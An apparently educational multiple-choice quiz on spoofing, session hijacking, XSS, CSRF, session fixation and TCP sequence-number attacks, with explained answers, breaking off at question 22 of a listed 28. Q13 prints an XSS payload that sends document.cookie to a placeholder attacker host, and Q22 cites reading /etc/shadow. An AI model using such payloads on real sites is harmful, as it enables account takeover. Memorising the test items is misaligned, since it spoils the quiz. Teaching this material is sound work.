# MCQ Set — Session 16B: Spoofing vs Hijacking · Session Hijacking · Prevention 🎭

> 28 MCQs · 4 options each · Full explanations · Covers core + extra notes

---

## 📑 Table of Contents

- [Questions 01–05 — Spoofing vs Hijacking](#questions-0105--spoofing-vs-hijacking)
- [Questions 06–11 — Session Hijacking Types & Fundamentals](#questions-0611--session-hijacking-types--fundamentals)
- [Questions 12–17 — Application-Level Techniques](#questions-1217--application-level-techniques)
- [Questions 18–22 — TCP Session Hijacking](#questions-1822--tcp-session-hijacking)
- [Questions 23–26 — Prevention & Countermeasures](#questions-2326--prevention--countermeasures)
- [Questions 27–28 — Extra Notes & Real-World](#questions-2728--extra-notes--real-world)
- [Answer Key](#answer-key)

---

## Questions 01–05 — Spoofing vs Hijacking

---

### Q01

**What is the MOST precise technical distinction between spoofing and session hijacking?**

- A) Spoofing targets Layer 3; session hijacking always targets Layer 7
- B) Spoofing is used only in DoS attacks; session hijacking is used only in web attacks
- C) Spoofing requires a botnet; session hijacking requires only a single machine
- D) ✅ Spoofing fakes an identity for a new transaction with no existing session; session hijacking steals an already-authenticated session that is currently in progress

**Explanation:**

- **A** is incorrect — both spoofing and hijacking can occur at multiple layers. IP spoofing is Layer 3, ARP spoofing is Layer 2, email spoofing is Layer 7. TCP session hijacking is Layer 4, cookie hijacking is Layer 7. Layer number does not define the distinction.
- **B** is incorrect — spoofing is used in many attacks beyond DoS (ARP poisoning for MITM, email spoofing for phishing). Session hijacking is used beyond web apps (Telnet sessions, SSH sessions). Neither is limited to a single attack category.
- **C** is incorrect — spoofing does not require a botnet. A single machine can spoof IP addresses. Session hijacking also operates from a single machine. Botnet involvement is irrelevant to this distinction.
- **D** ✅ is correct — the defining difference is the **presence of an existing session**. Spoofing creates a **false identity for a new, unauthenticated transaction** — the attacker pretends to be someone else from scratch. Session hijacking **takes over an already-authenticated session** — the victim has already logged in and proved their identity; the attacker steals the token that represents that proven identity. Spoofing can enable hijacking (e.g., ARP spoofing creates MITM position → enables session token capture) but they are structurally different attacks.

---

### Q02

**An attacker forges the source IP address in DNS query packets, directing amplified DNS responses to a victim server. Which attack category does this represent?**

- A) Session Hijacking — the attacker is stealing the DNS session
- B) ✅ Spoofing — the attacker is falsifying the source IP address to redirect traffic without any existing authenticated session
- C) Active Hijacking — the attacker is actively injecting packets into an established DNS session
- D) Passive Hijacking — the attacker is silently monitoring DNS traffic

**Explanation:**

- **A** is incorrect — there is no DNS "session" being stolen. DNS uses stateless UDP queries — there is no authenticated session to hijack. The attack does not involve taking over any established, authenticated connection.
- **B** ✅ is correct — forging the source IP address in a packet is **IP spoofing** — the fundamental form of identity falsification at the network layer. No prior session exists. The attacker is creating false source information in new packets to redirect traffic. This is the definition of spoofing: fake identity, new transaction, no existing session required.
- **C** is incorrect — active hijacking involves taking over an existing authenticated session and injecting commands. DNS amplification creates new forged UDP packets — it does not inject into an established session.
- **D** is incorrect — passive hijacking involves silently monitoring an existing authenticated session. DNS amplification generates forged packets — it does not passively observe any session.

---

### Q03

**Which of the following scenarios represents SESSION HIJACKING and not spoofing?**

- A) An attacker forges the From: address in an email to appear to come from a bank
- B) An attacker sends SYN packets with a fake source IP to flood a server's backlog
- C) An attacker modifies ARP replies to associate their MAC with the gateway's IP
- D) ✅ An attacker captures a session cookie from HTTP traffic and replays it to the banking website to access the victim's account

**Explanation:**

- **A** is incorrect — forging the From: address in an email is **email spoofing** — creating a false identity in a new message with no existing authenticated session being stolen.
- **B** is incorrect — sending SYN packets with fake source IPs is **IP spoofing** used in a SYN flood attack — no existing authenticated session is being taken over.
- **C** is incorrect — modifying ARP replies to associate the attacker's MAC with a gateway IP is **ARP spoofing** (also called ARP poisoning) — falsifying Layer 2 identity information. While ARP spoofing enables MITM which can lead to session hijacking, the ARP action itself is spoofing.
- **D** ✅ is correct — capturing a session cookie from HTTP traffic and replaying it to impersonate an authenticated user is **session hijacking**. The victim already authenticated (established a session), the attacker stole the session token (proof of authentication), and replayed it to impersonate the victim. All three defining characteristics of hijacking are present: existing session, token theft, impersonation of authenticated user.

---

### Q04

**An attacker sends emails appearing to come from `security@paypal.com` to trick users into clicking a malicious link. The real sender is `attacker@evil.com`. SPF, DKIM, and DMARC are the primary countermeasures. Which spoofing type is this?**

- A) IP Spoofing
- B) DNS Spoofing
- C) Website Spoofing
- D) ✅ Email Spoofing

**Explanation:**

- **A** is incorrect — IP spoofing falsifies the source IP address in network packet headers. Email spoofing operates at the application layer (SMTP) — the attacker modifies the `From:` header field in the email message, not the IP packet.
- **B** is incorrect — DNS spoofing provides false DNS responses (IP addresses for domain names). This attack forges the sender identity in an email message — not a DNS response.
- **C** is incorrect — website spoofing creates a fake website mimicking a legitimate one. This attack creates fake EMAIL MESSAGES — not websites. Website spoofing would involve creating a fake paypal.com website, not forging the email sender.
- **D** ✅ is correct — forging the `From:` header in email messages to impersonate a trusted sender is **email spoofing**. The countermeasures are DNS-based: **SPF** (Sender Policy Framework — specifies which mail servers may send for a domain), **DKIM** (DomainKeys Identified Mail — cryptographic signature on emails), and **DMARC** (Domain-based Message Authentication, Reporting and Conformance — policy for what to do when SPF/DKIM fail). All three DNS records help receiving mail servers validate email authenticity.

---

### Q05

**A victim receives a phone call appearing to come from their bank's official number (555-0100). The caller is actually an attacker using VoIP caller ID manipulation. What type of spoofing is this and what social engineering attack is it commonly used for?**

- A) MAC Spoofing — used in network reconnaissance attacks
- B) GPS Spoofing — used in navigation misdirection attacks
- C) Website Spoofing — used in credential harvesting attacks
- D) ✅ Caller ID Spoofing — used in vishing (voice phishing) attacks to impersonate trusted organizations

**Explanation:**

- **A** is incorrect — MAC spoofing changes the hardware address in Ethernet frames — a Layer 2 network attack. It has no relevance to phone calls.
- **B** is incorrect — GPS spoofing transmits false GPS signals to fool navigation systems. Phone caller ID manipulation is not GPS-related.
- **C** is incorrect — website spoofing creates fake websites. A phone call using a spoofed number is not a website.
- **D** ✅ is correct — **caller ID spoofing** uses VoIP (Voice over IP) technology to transmit any arbitrary number as the calling party identifier — regardless of the actual originating number. The receiving phone displays the spoofed number. Attackers use this in **vishing (voice phishing)** campaigns — calling victims while appearing to be banks, government agencies, IRS, or IT helpdesks — to extract credentials, OTPs, account numbers, or social security numbers. The victim trusts the call because the displayed number matches the legitimate organization.

---

## Questions 06–11 — Session Hijacking Types & Fundamentals

---

### Q06

**Why is HTTP session management inherently vulnerable to session hijacking — and what is the root architectural cause?**

- A) HTTP uses weak encryption — attackers break the cipher and read session data
- B) HTTP sends session tokens in packet headers which are encrypted but have a known format
- C) ✅ HTTP is stateless — applications must use session tokens to track authenticated users — and whoever possesses a valid token is treated as authenticated, regardless of how that token was obtained
- D) HTTP session tokens are based on user passwords — so credential theft automatically enables session hijacking

**Explanation:**

- **A** is incorrect — HTTP (not HTTPS) uses NO encryption at all. The vulnerability is not about weak encryption — it is about the fundamental stateless architecture requiring tokens.
- **B** is incorrect — HTTP transmits session tokens in cleartext headers (not encrypted). The vulnerability is not about a known format — it is about the token being the ONLY proof of authentication, making its possession equivalent to authentication.
- **C** ✅ is correct — HTTP's stateless design requires applications to issue session tokens after authentication and include them in every subsequent request. The server validates the token and grants access — it does not verify the identity of the token presenter beyond possession of the token. This means **possessing the token = being authenticated** from the server's perspective. If an attacker obtains the token (by any means — sniffing, XSS, fixation), they are indistinguishable from the legitimate user. The root cause is the delegation of authentication proof to an easily-stealable token.
- **D** is incorrect — session tokens are separate from passwords. They are randomly generated server-side after successful authentication. Knowing the password does not give you the session token, and vice versa.

---

### Q07

**What is the critical difference between active session hijacking and passive session hijacking in terms of victim impact and attacker detectability?**

- A) Active hijacking works on application-layer sessions; passive hijacking only works on TCP-layer sessions
- B) Active hijacking requires a botnet; passive hijacking requires only a network sniffer
- C) Active hijacking steals tokens from HTTPS sessions; passive hijacking only works on HTTP sessions
- D) ✅ Active hijacking involves the attacker sending packets and directly taking over the session — disrupting the victim — making it detectable; passive hijacking silently monitors and collects the session token without disturbing the victim — making it nearly undetectable

**Explanation:**

- **A** is incorrect — both active and passive hijacking can operate at application or network layers. The distinction is about participation (sending packets) and victim impact — not the protocol layer.
- **B** is incorrect — neither active nor passive hijacking inherently requires a botnet. Both typically operate from a single attacker machine. The distinction is about whether the attacker sends traffic into the session.
- **C** is incorrect — both types can target HTTP or HTTPS sessions (though HTTPS makes passive sniffing ineffective, active MITM with certificate manipulation can still work). HTTPS vs HTTP is not the defining distinction.
- **D** ✅ is correct — **active hijacking**: attacker sends forged packets into the session, executes commands as the victim, often sends RST to disconnect the victim — the victim notices their session dropped or behaves erratically. Generates anomalous traffic visible to IDS. **Passive hijacking**: attacker silently captures all session data (including the token) without sending any additional packets — victim experiences no disruption, session continues normally — attacker later replays the captured token. Near-zero detection footprint. The trade-off is capability (active = immediate control) vs stealth (passive = undetected collection).

---

### Q08

**A session token consists of a user ID and timestamp concatenated and hashed with MD5: `MD5(userid + timestamp)`. Why is this token design vulnerable to prediction attacks?**

- A) MD5 is an asymmetric algorithm — the private key can be extracted from the hash
- B) The token is too short — only 32 characters make brute force trivial
- C) ✅ Both the user ID and timestamp are predictable or observable values — an attacker who knows or can guess these inputs can compute the same MD5 hash and predict valid session tokens
- D) MD5 hashes are stored in plaintext on the server — attackers can read them directly from server logs

**Explanation:**

- **A** is incorrect — MD5 is a cryptographic hash function, not an asymmetric encryption algorithm. There is no private key. Hash functions are one-way by design — but this is irrelevant to the prediction vulnerability described.
- **B** is incorrect — MD5 produces a 32-character hexadecimal output (128-bit hash). While MD5 has collision vulnerabilities, the issue here is not hash length or brute-force feasibility — it is input predictability.
- **C** ✅ is correct — a secure session token must be **unpredictable** — generated from cryptographically secure randomness that an attacker cannot reproduce. If the token is derived from **predictable inputs** (user ID — known or enumerable; timestamp — can be approximated to within seconds), an attacker who knows the user ID and approximate login time can compute all plausible MD5(userid + timestamp) values, submit them as session tokens, and find the valid one. MD5 itself is fast to compute — allowing millions of candidates per second.
- **D** is incorrect — the vulnerability is in the token GENERATION algorithm, not server storage. Even if the token were stored securely, the predictable generation allows offline computation of valid tokens.

---

### Q09

**A session token is found embedded in the URL as a query parameter: `https://app.com/dashboard?token=abc123xyz`. Beyond being visible in the browser address bar, what are TWO additional security risks specific to URL-embedded tokens?**

- A) URL tokens cannot be encrypted by TLS and are always transmitted in cleartext
- B) URL tokens expire immediately — they cannot be reused unlike cookie-based tokens
- C) ✅ URL tokens appear in server access logs (exposing them to anyone with log access) and are sent in the HTTP Referer header to any third-party domain loaded by the page
- D) URL tokens are automatically shared with all subdomains — creating cross-subdomain session leakage

**Explanation:**

- **A** is incorrect — HTTPS (TLS) encrypts the full URL including query parameters. The URL IS encrypted in transit. The risks are about log exposure and Referer leakage — not TLS encryption.
- **B** is incorrect — URL-embedded tokens do not expire immediately. They persist with the same TTL as cookie-based tokens — often making them MORE persistent (users bookmark URLs with tokens, share them inadvertently).
- **C** ✅ is correct — two specific risks: **(1) Server access logs**: web servers (Apache, Nginx, IIS) log complete request URLs including query parameters. The session token appears in plaintext in access logs, error logs, and proxy logs — accessible to any administrator, log aggregation tool, or attacker who gains log access. **(2) Referer header leakage**: when a page containing external resources (images, analytics, ads, CDN assets) is loaded, the browser sends the `Referer: https://app.com/dashboard?token=abc123xyz` header to EVERY third-party domain. The session token is sent to Google Analytics, ad networks, and any external resource — exposing it to dozens of third parties.
- **D** is incorrect — cookie `Domain` attributes control subdomain sharing. URL query parameters are not automatically shared with subdomains — they are part of the specific URL requested.

---

### Q10

**What specific property of a stored XSS attack makes it MORE dangerous than a reflected XSS attack for session hijacking purposes?**

- A) Stored XSS can steal tokens from HTTPS sessions; reflected XSS only works on HTTP
- B) Stored XSS bypasses the HttpOnly cookie attribute; reflected XSS cannot
- C) Stored XSS works without any victim user interaction; reflected XSS requires the attacker to physically access the victim's machine
- D) ✅ Stored XSS persists in the application database and automatically executes for every user who views the infected page — stealing sessions from all visitors; reflected XSS requires each victim to click a specifically crafted link

**Explanation:**

- **A** is incorrect — both stored and reflected XSS execute JavaScript in the victim's browser context with the same privileges regardless of HTTP or HTTPS. HTTPS protects the transmission channel but does not prevent JavaScript execution within the browser.
- **B** is incorrect — both stored and reflected XSS are equally blocked by the HttpOnly cookie attribute. HttpOnly prevents `document.cookie` access regardless of how the XSS was delivered. Neither type can bypass HttpOnly.
- **C** is incorrect — reflected XSS requires the victim to click a crafted link (e.g., via phishing) — but this is social engineering delivered remotely, not physical device access. The distinction is persistence and scale, not physical access.
- **D** ✅ is correct — **stored XSS** (also called persistent XSS) stores the malicious script in the application database (e.g., in a comment, username, profile field). Every subsequent user who loads the page containing this stored data executes the malicious script automatically — no interaction beyond normal browsing required. One injection = theft from all future visitors. **Reflected XSS** is non-persistent — the script is in the URL parameter. Each victim must individually click the crafted link for execution. Stored XSS is therefore far more scalable for mass session token theft.

---

### Q11

**Which of the following CORRECTLY explains why session tokens stored in browser `localStorage` are considered LESS SECURE than session tokens stored in `HttpOnly` cookies for protecting against XSS-based theft?**

- A) localStorage tokens are automatically sent to all domains — HttpOnly cookies are domain-restricted
- B) localStorage tokens are stored in plaintext on disk — HttpOnly cookies are encrypted before storage
- C) localStorage tokens expire with the browser session — HttpOnly cookies persist indefinitely
- D) ✅ localStorage is fully accessible to any JavaScript on the page — XSS can read it with `localStorage.getItem()` — whereas HttpOnly cookies cannot be accessed by JavaScript at all, making XSS token theft impossible for HttpOnly cookies

**Explanation:**

- **A** is incorrect — localStorage is origin-scoped (same-origin policy) — accessible only to pages from the same origin. HttpOnly cookies have their own domain and path restrictions. Both have cross-domain restrictions — the automatic sending to all domains is not the distinction.
- **B** is incorrect — both localStorage and cookies are stored in browser profile data on disk. Neither is encrypted by default by the browser (though OS-level protections may apply). Encryption is not the relevant distinction.
- **C** is incorrect — `localStorage` persists beyond the browser session (unlike `sessionStorage`). HttpOnly cookies with no expiry also persist. Persistence is configurable for both — not the defining security distinction.
- **D** ✅ is correct — `localStorage` is a JavaScript API — any script running on the page (including attacker-injected XSS) can access it: `localStorage.getItem('access_token')`. This means XSS can trivially steal JWT access tokens stored in localStorage. **HttpOnly cookies** are transmitted by the browser with HTTP requests but are **completely inaccessible to JavaScript** — `document.cookie` does not return HttpOnly cookies, and there is no JavaScript API to read them. An XSS script on the same origin cannot read HttpOnly cookie values — making token theft via XSS impossible when tokens are stored in HttpOnly cookies.

---

## Questions 12–17 — Application-Level Techniques

---

### Q12

**Explain the mechanism of a session fixation attack and identify the specific server-side vulnerability it exploits.**

- A) Session fixation exploits servers that use weak random number generators — allowing the attacker to predict the session ID the server will assign
- B) Session fixation exploits servers that transmit session IDs in cleartext over HTTP — allowing the attacker to capture the ID
- C) Session fixation exploits servers that store session data in client-side cookies — allowing the attacker to modify the session data directly
- D) ✅ Session fixation exploits servers that accept a session ID provided by the client AND do not generate a new session ID after successful authentication — allowing an attacker who pre-planted a known ID to use it after the victim's login validates it

**Explanation:**

- **A** is incorrect — weak random number generators enable session prediction (guessing the server-assigned token). Session fixation is different — the attacker does not need to guess or predict anything. The attacker CONTROLS the session ID by planting it before login.
- **B** is incorrect — cleartext transmission enables sniffing of session tokens. Session fixation does not require observing traffic — the attacker ALREADY KNOWS the session ID because they set it themselves.
- **C** is incorrect — client-side cookie manipulation (e.g., modifying role from "user" to "admin") is a different vulnerability (insecure session storage / tampering). Session fixation involves the SERVER accepting an attacker-controlled session identifier.
- **D** ✅ is correct — session fixation has two required vulnerabilities: **(1)** The server accepts session IDs provided by the client via URL parameter or cookie — rather than always generating its own. **(2)** The server does NOT invalidate the pre-login session ID and generate a fresh one after successful authentication. The attack: attacker obtains any valid (unauthenticated) session ID → sends victim a link with that ID embedded → victim authenticates using that ID → server now associates the KNOWN ID with victim's authenticated identity → attacker uses the same known ID to access victim's account. The fix: always call `session_regenerate_id(true)` immediately after authentication.

---

### Q13

**What is the correct sequence of events in an XSS-based session hijacking attack where the attacker has NO direct network access to the victim's machine?**

- A) Attacker sniffs network → captures cookie → replays cookie to server
- B) Attacker performs ARP poisoning → intercepts HTTP → extracts cookie from headers
- C) ✅ Attacker injects JavaScript into vulnerable web application → victim visits page → script executes in victim's browser → script reads document.cookie → script sends cookie to attacker's server → attacker replays cookie
- D) Attacker brute forces session token → submits each token candidate to server → finds valid token by server response difference

**Explanation:**

- **A** is incorrect — network sniffing requires the attacker to be on the same network segment or in a MITM position. The question specifies NO direct network access to the victim's machine. XSS-based theft requires no network access — it uses the victim's own browser as the delivery mechanism.
- **B** is incorrect — ARP poisoning requires Layer 2 network access to the same segment as the victim. Again, no direct network access is specified — XSS operates entirely through the web application vulnerability.
- **C** ✅ is correct — XSS-based session hijacking without network access: **(1)** Attacker finds XSS vulnerability (e.g., unsanitized comment field) and injects script: `<script>new Image().src='http://attacker.com/?c='+document.cookie</script>`. **(2)** This script is stored in the application database. **(3)** Victim (logged in) loads the page. **(4)** Victim's browser executes the injected script in the context of the target domain. **(5)** `document.cookie` returns the session cookie for that domain. **(6)** Browser makes a GET request to attacker's server with the cookie value. **(7)** Attacker sees cookie in server logs and replays it. No network access to victim required — only access to the vulnerable web application.
- **D** is incorrect — brute forcing session tokens (without predictability analysis) requires weak tokens and many requests. The question asks about XSS-based hijacking specifically, and brute force does not involve XSS or JavaScript injection.

---

### Q14

**How does CSRF differ fundamentally from XSS-based session hijacking in terms of what the attacker obtains and how the attack achieves its goal?**

- A) CSRF requires network access; XSS can be executed remotely — both ultimately steal the session cookie
- B) CSRF targets the session token; XSS targets the user's password — both result in account takeover
- C) CSRF only works on HTTP; XSS works on both HTTP and HTTPS — the protocol determines which applies
- D) ✅ XSS steals the session token — the attacker uses it directly from their own session; CSRF never obtains the token — it forces the victim's own browser to make attacker-chosen requests using the victim's existing authenticated session

**Explanation:**

- **A** is incorrect — CSRF does not require network access. It works by tricking the victim's browser into making requests to a site where the victim is authenticated. Neither CSRF nor XSS requires local network access — both operate via web content. Critically, CSRF does NOT steal the cookie.
- **B** is incorrect — CSRF does not target the session token or password. It exploits the fact that browsers automatically include cookies with cross-origin requests — the attacker never receives or uses the token themselves.
- **C** is incorrect — both CSRF and XSS work regardless of HTTP or HTTPS. XSS executes JavaScript in the browser — unaffected by transport encryption. CSRF relies on cookie inclusion in cross-origin requests — also independent of transport layer.
- **D** ✅ is correct — the fundamental difference: **XSS steals** the token — `document.cookie` → attacker receives the actual token value → attacker replays it from their own browser. **CSRF never steals anything** — it crafts a malicious request (img src, form submit, link) that the victim's browser executes automatically. The victim's browser sends the request WITH the victim's own cookies (which the attacker never sees). The server receives what appears to be a legitimate authenticated request from the victim and processes it. The attacker specifies WHAT action to execute — but uses the victim's own browser and session to execute it.

---

### Q15

**In a Man-in-the-Browser (MitB) attack against online banking, the victim initiates a legitimate £100 transfer to a friend over HTTPS. The attacker has previously infected the victim's browser with a MitB Trojan. What actually happens and why does HTTPS NOT prevent this attack?**

- A) HTTPS prevents MitB because TLS encryption makes it impossible for any code inside the browser to read the plaintext
- B) MitB attacks only work on HTTP — if the bank uses HTTPS, the attack fails automatically
- C) MitB intercepts the TLS handshake — it inserts a fraudulent certificate — victim sees a warning — attack requires victim to ignore certificate warnings
- D) ✅ MitB operates INSIDE the browser after TLS decryption — it intercepts the plaintext form data before encryption — modifying the transfer details before they are encrypted and sent — so TLS only protects the modified (fraudulent) transaction

**Explanation:**

- **A** is incorrect — TLS encrypts data **between the browser and server**. But MitB operates **within the browser process itself** — after TLS decryption on inbound data and before TLS encryption on outbound data. TLS protects the channel — not the endpoints. Once data is inside the browser, TLS has done its job — the Trojan accesses the plaintext.
- **B** is incorrect — MitB attacks specifically TARGET HTTPS banking sessions. HTTPS does not prevent MitB. Zeus, SpyEye, and URLZone were all designed specifically to attack HTTPS banking sessions — where other network-level attacks fail.
- **C** is incorrect — MitB does not perform TLS certificate interception. It does not insert fraudulent certificates and does not trigger certificate warnings. MitB hooks into browser APIs (BHO, browser extensions, function hooking) to intercept form data at the application layer — after TLS is already handled correctly.
- **D** ✅ is correct — MitB's key insight is targeting **the point inside the browser where data is plaintext**: after the server's response is decrypted by TLS (victim sees real bank page) and before the victim's form submission is encrypted by TLS. The Trojan intercepts the form submission event, modifies `recipient = friend → attacker_account` and `amount = 100 → 10000`, then allows the modified data to be encrypted by TLS and sent to the bank. The bank receives a validly-authenticated, TLS-secured request — for a fraudulent transaction. The victim's screen shows the unmodified confirmation (MitB modifies the display too).

---

### Q16

**A developer implements the following PHP code immediately after verifying login credentials. What session hijacking vulnerability does this code have and what is the fix?**

    session_start();
    $_SESSION['user'] = $username;
    $_SESSION['authenticated'] = true;
    header('Location: /dashboard');

- A) The code stores the username in plaintext — fix by encrypting $_SESSION['user']
- B) The code does not set the HttpOnly flag — fix by adding `ini_set('session.cookie_httponly', 1)`
- C) The code uses PHP sessions which are inherently insecure — fix by switching to JWT
- D) ✅ The code does not regenerate the session ID after authentication — fix by calling `session_regenerate_id(true)` before setting session variables, preventing session fixation attacks

**Explanation:**

- **A** is incorrect — storing the username in a server-side session variable is not a vulnerability. Session data stored server-side is not directly accessible to clients. The username in `$_SESSION` stays on the server — clients only have the session ID.
- **B** is incorrect — while setting HttpOnly is a good security practice, missing it is a separate issue from the vulnerability in this specific code. The question asks about the specific vulnerability THIS code has. HttpOnly is set via `ini_set` or `php.ini` — it is a configuration concern, not shown to be missing here.
- **C** is incorrect — PHP sessions are not inherently insecure. JWT has its own security considerations. The vulnerability here is specific to the session ID lifecycle — not the underlying session mechanism.
- **D** ✅ is correct — this code starts a session and authenticates the user but **never generates a new session ID**. If an attacker performed session fixation (pre-planted a known session ID before the victim logged in), the victim authenticates using that planted ID — and this code KEEPS that same ID and marks it as authenticated. The attacker now has an authenticated session. The fix: `session_regenerate_id(true)` called **before** setting session variables — creates a new random session ID, marks the old one as invalid (the `true` parameter deletes the old session). The attacker's planted ID becomes worthless.

---

### Q17

**A bank website uses a form to transfer funds. The form includes a hidden field with a CSRF token: `<input type="hidden" name="csrf_token" value="a3f9b2c1">`. How does this specifically prevent a CSRF attack?**

- A) The CSRF token encrypts the form data — attackers cannot forge valid encrypted requests
- B) The CSRF token is the session cookie — including it in the form binds the session to the form submission
- C) The CSRF token prevents XSS — because the token changes the Content-Security-Policy for the page
- D) ✅ The CSRF token is a server-generated secret that the attacker cannot know — a forged cross-site request cannot include the correct token — the server validates its presence and rejects requests with missing or incorrect tokens

**Explanation:**

- **A** is incorrect — CSRF tokens do not encrypt form data. They are validation secrets — their purpose is to prove that a form submission originated from the legitimate page (same origin) rather than a forged cross-site request.
- **B** is incorrect — the CSRF token is separate from the session cookie. It is a per-form or per-session secret specifically for validating form origin. The session cookie proves authentication; the CSRF token proves the request came from the legitimate form.
- **C** is incorrect — CSRF tokens have nothing to do with Content-Security-Policy or XSS prevention. They are entirely separate security mechanisms addressing different attacks.
- **D** ✅ is correct — CSRF works because the attacker can **trigger requests from the victim's browser** but cannot **read the response** (same-origin policy blocks cross-origin response reading). The CSRF token appears in the HTML of the legitimate page — the attacker cannot read it (blocked by same-origin policy). A forged request from attacker's page cannot include the correct CSRF token. The server checks: present? correct? if not → reject. The attacker's cross-site request has no way to obtain `a3f9b2c1` — so the forged request is rejected. This is why CSRF tokens must be included in every state-changing form and validated server-side.

---

## Questions 18–22 — TCP Session Hijacking

---

### Q18

**In TCP session hijacking at the network level, why must the attacker know the EXACT sequence number of the next expected packet — and what happens if the sequence number is even 1 byte off?**

- A) An incorrect sequence number triggers a firewall rule that blocks the attacker's IP permanently
- B) An incorrect sequence number causes the target server to send an ICMP error to the attacker, revealing the correct sequence number
- C) An incorrect sequence number causes the target to close the connection and notify the victim of a security breach
- D) ✅ An incorrect sequence number causes the server to silently discard the injected packet as out-of-window data — the injection completely fails with no indication to the attacker

**Explanation:**

- **A** is incorrect — TCP sequence number validation is a transport-layer mechanism in the OS network stack. It does not trigger firewall rules or IP blocking. The server simply discards the invalid packet.
- **B** is incorrect — the server does not send ICMP errors for out-of-window TCP segments. It either discards them silently or sends a TCP ACK for the last correctly received byte — which tells the sender "I expected X" — but this goes to the SPOOFED source IP (victim's IP in a hijacking scenario), not the attacker.
- **C** is incorrect — TCP does not have a "security breach notification" mechanism. Out-of-window segments are silently dropped. No connection closure or notification occurs from a single bad sequence number.
- **D** ✅ is correct — TCP implements a **receive window** — only segments whose sequence numbers fall within the expected window are accepted. Any segment with a sequence number outside this range is silently discarded. The server does not send any response to the attacker for the discarded packet. The injection silently fails. This is why obtaining the precise current sequence number (via MITM packet capture or traffic analysis) is the critical prerequisite for TCP-level session hijacking. Being wrong by even 1 byte = complete failure.

---

### Q19

**After successfully injecting a packet into a TCP session, an attacker observes a rapid flood of TCP ACK packets with no data payload between the victim and server. What is this phenomenon, what causes it, and is it intentional?**

- A) This is a SYN flood — the attacker deliberately initiated it to exhaust the server's connection table as part of the hijacking
- B) This is normal TCP keepalive behavior — expected during any active TCP session and unrelated to the hijacking
- C) This is a RESET storm — the server is sending RST packets to close the hijacked connection — the attacker should stop immediately
- D) ✅ This is an ACK storm — an unintentional side effect of desynchronization — the attacker's injection caused victim and server to have mismatched sequence number expectations — each sends ACKs the other rejects — creating a self-reinforcing loop

**Explanation:**

- **A** is incorrect — an ACK storm contains ACK packets with no data — not SYN packets. SYN floods contain SYN packets from the attacker. The ACK storm in this context is from the victim and server — not the attacker — and is not deliberate.
- **B** is incorrect — TCP keepalive packets are infrequent (sent every 2 hours by default when idle) and are specifically formatted keep-alive probes. An ACK storm is a rapid, high-rate exchange of regular ACK packets — clearly anomalous and definitively not normal keepalive behavior.
- **C** is incorrect — an ACK storm involves ACK packets — not RST packets. RST packets teardown connections. ACK packets acknowledge data. The storm is ACKs oscillating between victim and server — both confused about expected sequence numbers.
- **D** ✅ is correct — the **ACK storm** is a direct consequence of **desynchronization** caused by the attacker's injection. After injection: server has advanced its expected client sequence number (received injected data). Client still believes the old sequence number is current. Client sends packet with old seq → server rejects (sends ACK for the new expected seq) → client receives unexpected ACK → sends its own ACK back → server sends ACK → loop. Each side keeps sending ACKs that are "wrong" from the other's perspective. This is NOT intentional — it is a detectable side effect. A sophisticated attacker suppresses it by sending RST to the victim, dropping their connection entirely.

---

### Q20

**Why did Kevin Mitnick's 1994 TCP ISN prediction attack require him to FIRST launch a DoS attack against the trusted host (`trusted.com`) before impersonating it to the target server?**

- A) The DoS attack was needed to overload the target server's connection table — making it accept connections without sequence number validation
- B) The DoS attack cleared the target server's ARP cache — enabling Mitnick to insert his own MAC address for trusted.com's IP
- C) ✅ Without DoS on the trusted host, when the target sent SYN-ACK to trusted.com, trusted.com would respond with RST — automatically clearing the half-open entry — preventing Mitnick from completing the spoofed handshake with his predicted sequence number
- D) The DoS attack caused the target server to use a predictable ISN — without DoS the ISN was random and could not be predicted

**Explanation:**

- **A** is incorrect — connection table size is not the issue. The server validates sequence numbers regardless of load. The problem was specifically RST packets that would close the half-open connection.
- **B** is incorrect — ARP cache manipulation was not the mechanism of Mitnick's attack. He used IP spoofing at Layer 3 — not ARP manipulation.
- **C** ✅ is correct — Mitnick's problem: to establish a spoofed TCP connection as `trusted.com`, he sent a SYN with source IP = trusted.com's IP. The target server responded with SYN-ACK to the REAL trusted.com. If trusted.com was operational, it would receive this unexpected SYN-ACK (it never sent a SYN) and respond with RST — immediately terminating the half-open entry Mitnick needed. By **DoS-flooding trusted.com first** (SYN flooding or ICMP flooding), Mitnick ensured trusted.com could not respond. The RST packets from trusted.com never arrived — the half-open entry persisted — giving Mitnick time to complete the handshake with his predicted ISN.
- **D** is incorrect — the DoS on trusted.com did not affect the TARGET server's ISN generation. Mitnick observed the target server's ISNs by making test connections FROM OTHER ADDRESSES — observing that the target used sequential ISNs — and predicted the next one. The DoS was entirely about suppressing RST responses from trusted.com.

---

### Q21

**RFC 6528 specifies TCP ISN randomization. How does this specifically prevent TCP session hijacking and ISN prediction attacks?**

- A) RFC 6528 encrypts the TCP handshake — making sequence numbers invisible to network monitors
- B) RFC 6528 requires mutual authentication before TCP session establishment — preventing spoofed connections
- C) RFC 6528 limits the number of simultaneous connections from any single IP — preventing session flooding
- D) ✅ RFC 6528 requires ISNs to be generated using a cryptographic pseudorandom function seeded with a secret — making ISNs statistically indistinguishable from random values and computationally infeasible to predict

**Explanation:**

- **A** is incorrect — RFC 6528 does not encrypt the TCP handshake. Sequence numbers are still visible in packet captures (TCP headers are plaintext unless TLS/IPSec is used). Randomization prevents PREDICTION — not observation.
- **B** is incorrect — RFC 6528 does not add mutual authentication to TCP. TCP still uses the three-way handshake with no cryptographic identity verification. Mutual authentication requires TLS client certificates or application-layer mechanisms.
- **C** is incorrect — connection rate limiting is a DoS countermeasure unrelated to RFC 6528. RFC 6528 addresses the randomness of Initial Sequence Numbers — not connection rates.
- **D** ✅ is correct — RFC 6528 mandates: `ISN = F(local_ip, local_port, remote_ip, remote_port, secret_key, timestamp)` where F is a **PRF (Pseudorandom Function)** — specifically keyed with a secret that changes periodically. Even if the attacker observes many TCP connections and their ISNs, they cannot reverse the PRF to find the secret, and therefore cannot predict future ISNs for new connections. The ISN looks completely random to anyone without the secret key. This rendered TCP ISN prediction attacks like Mitnick's completely infeasible against any modern OS.

---

### Q22

**An attacker successfully performs TCP session hijacking against a Telnet session. After injecting the command `cat /etc/shadow`, what TWO immediate problems does the attacker face?**

- A) The server will detect the injected command signature and block execution; the attacker's IP will be logged
- B) ✅ The server's response is sent to the VICTIM's IP (not the attacker's) — so the attacker cannot read the output unless in MITM position; and the injection causes desynchronization triggering an ACK storm that reveals the attack
- C) The /etc/shadow file is encrypted — the attacker cannot read it without the encryption key; and the Telnet session terminates after each injected command
- D) The injected command requires root privileges — the attacker must first inject a privilege escalation; and the server rate-limits command execution after one injection

**Explanation:**

